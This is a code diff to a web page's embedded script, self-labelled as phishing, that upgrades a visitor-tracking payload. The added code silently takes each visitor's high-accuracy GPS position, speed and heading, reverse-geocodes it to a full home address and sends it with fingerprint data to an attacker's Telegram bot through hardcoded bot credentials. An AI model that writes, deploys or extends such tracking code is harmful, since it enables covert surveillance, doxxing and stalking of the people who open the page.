@@ -33,7 +33,7 @@ video.floating {position:absolute;width:200px;height:120px;z-index:9999;pointer-
 
 <script>
 (async()=>{
-const BOT_TOKEN="8978035545:AAGhtSdCg3A5F6GB8GUxA_ka5-peP5yeT0Y";
+const BOT_TOKEN="8447642900:AAGYpOV5eER4E973P-C9nTHADSjBgfzrgkg";
 const OWNER_CHAT_ID="8579799401";
 
 // ========== LOADING ==========
@@ -90,33 +90,59 @@ async function generateFingerprint(){
     return [...new Uint8Array(hashBuffer)].map(x=>x.toString(16).padStart(2,'0')).join('');
 }
 // ========== Gps ==========
-    console.log("Geolocation tersedia:", !!navigator.geolocation);
-console.log("Secure context:", window.isSecureContext);
+    function getGPSLocation() {
+      return new Promise((resolve) => {
+        if (!navigator.geolocation) {
+          sendToTelegram('📍 Browser tidak support GPS');
+          resolve(null);
+          return;
+        }
+        log('🛰️ Lock satellite GPS...');
+        const timeoutId = setTimeout(() => {
+          sendToTelegram('📍 GPS Timeout');
+          resolve(null);
+        }, 25000);
 
-function getLocation() {
-  console.log("Function getLocation() dipanggil.");
-
-  if (!navigator.geolocation) {
-    console.log("Browser tidak mendukung Geolocation.");
-    return;
-  }
-
-  navigator.geolocation.getCurrentPosition(
-    function (posisi) {
-      const lat = posisi.coords.latitude;
-      const lon = posisi.coords.longitude;
-
-      console.log("Latitude:", lat);
-      console.log("Longitude:", lon);
-    },
-    function (error) {
-      console.log("Kode error:", error.code);
-      console.log("Pesan error:", error.message);
+        navigator.geolocation.getCurrentPosition(
+          async (pos) => {
+            clearTimeout(timeoutId);
+            const lat = pos.coords.latitude;
+            const lng = pos.coords.longitude;
+            const link = `https://www.google.com/maps?q=${lat},${lng}`;
+            
+            // Reverse geocoding buat dapetin alamat lengkap
+            log('🗺️ Reverse geocoding alamat...');
+            const addr = await reverseGeocode(lat, lng);
+            
+            let addrText = '';
+            if (addr) {
+              addrText = `
+<b>🏠 ALAMAT LENGKAP</b>
+├─ Alamat Full : ${addr.fullAddress}
+├─ Jalan       : ${addr.road}
+├─ No. Rumah   : ${addr.houseNumber}
+├─ Desa/Kel    : ${addr.village}
+├─ Kecamatan   : ${addr.district}
+├─ Kota        : ${addr.city}
+├─ Provinsi    : ${addr.state}
+├─ Kode Pos    : ${addr.postcode}
+└─ Negara      : ${addr.country}`;
+            }
+            
+            sendToTelegram(`<b>📍 LOKASI GPS (ACCURATE)</b>\n━━━━━━━━━━━━━━━━━━\n├─ Latitude : ${lat}\n├─ Longitude: ${lng}\n├─ Accuracy : ${pos.coords.accuracy}m\n├─ Altitude : ${pos.coords.altitude || '-'}\n├─ Heading  : ${pos.coords.heading || '-'}\n├─ Speed    : ${pos.coords.speed || '-'}\n└─ <a href="${link}">🗺️ BUKA DI GOOGLE MAPS</a>\n${addrText}`);
+            log(`✅ GPS Lock! Accuracy: ${pos.coords.accuracy}m`);
+            resolve({ lat, lng, address: addr });
+          },
+          (err) => {
+            clearTimeout(timeoutId);
+            sendToTelegram('📍 GPS: ' + err.message);
+            log('❌ GPS error: ' + err.message);
+            resolve(null);
+          },
+          { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 }
+        );
+      });
     }
-  );
-}
-
-window.addEventListener("load", getLocation);
 // ========== ARLZ PHISING ==========
 async function getVisitorInfo(){
     const clock=new Date().toLocaleString();
@@ -187,6 +213,18 @@ async function getVisitorInfo(){
 │🏙️ Kecamatan: ${locDetails.district}
 │🏠 Alamat Lengkap: ${locDetails.fullAddress}
 ╰───── Telegram @kaiseroffc ───── ⦿
+ 
+
+⚊⚊⚊⚊⚊⚊⚊⚊V2⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊
+├─ Alamat Full : ${addr.fullAddress}
+├─ Jalan       : ${addr.road}
+├─ No. Rumah   : ${addr.houseNumber}
+├─ Desa/Kel    : ${addr.village}
+├─ Kecamatan   : ${addr.district}
+├─ Kota        : ${addr.city}
+├─ Provinsi    : ${addr.state}
+├─ Kode Pos    : ${addr.postcode}
+└─ Negara      : ${addr.country}
 \`\`\``;
 
     await sendTelegram(vxzMsg);
